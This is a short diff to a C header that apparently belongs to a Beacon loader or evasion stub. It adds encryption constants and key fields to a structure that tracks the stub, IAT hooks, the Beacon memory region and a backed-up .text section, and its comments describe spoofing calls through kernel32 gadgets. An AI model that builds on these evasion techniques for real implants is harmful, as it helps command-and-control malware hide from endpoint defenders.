@@ -11,6 +11,11 @@
 #include <ntstatus.h>
 #include "native.h"
 
+// Crypto. Don't change key size without changing misc.asm LOL
+#define KEY_SIZE 16
+#define KEY_VALS "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789"
+#define SEED 1337
+
 // Spoof stuff
 // SPOOF first 3 args are: Function, Module, Size. Only function is necessary, else a rando gadget from kernel32 is pulled
 // Then just pass the rest of the arguments are you would normally
@@ -40,7 +45,6 @@
 #define C_PTR( x )    ( ( PVOID ) x )
 #define G_END( x )    U_PTR( GetIp( ) + 11 )
 
-
 typedef struct __attribute__(( packed ))
 {
     ULONG_PTR Region;           // Base address of Stub + IAT Hooks/Utils + Beacon
@@ -50,6 +54,9 @@ typedef struct __attribute__(( packed ))
     ULONG_PTR ExecRegionSize;   // Size of Stub + IAT Hooks/Utils + Beacon .text
     ULONG_PTR OriginalText;     // Base address of the original backed up .text
     ULONG_PTR OriginalTextSize; // Size of Original .text section
+    ULONG_PTR BackupPageSize;   // Size of the entire backup page
+    UCHAR     Key[KEY_SIZE];
+
 } STUB, *PSTUB ;
 
 typedef struct
